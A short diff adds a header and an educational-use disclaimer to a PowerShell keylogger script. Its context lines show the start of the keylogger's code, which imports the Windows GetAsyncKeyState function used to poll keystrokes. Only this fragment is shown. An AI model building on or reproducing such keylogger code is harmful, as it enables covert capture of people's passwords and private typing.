@@ -1,3 +1,9 @@
+# Powershell_Keylogger https://github.com/Androsh7/Powershell_Keylogger
+# Written By Androsh7
+
+# THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY
+# MALICIOUS USE OF THIS TOOL MAY CONSTITUTE A CRIME
+
 $Signature = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
     public static extern short GetAsyncKeyState(int virtualKeyCode); 
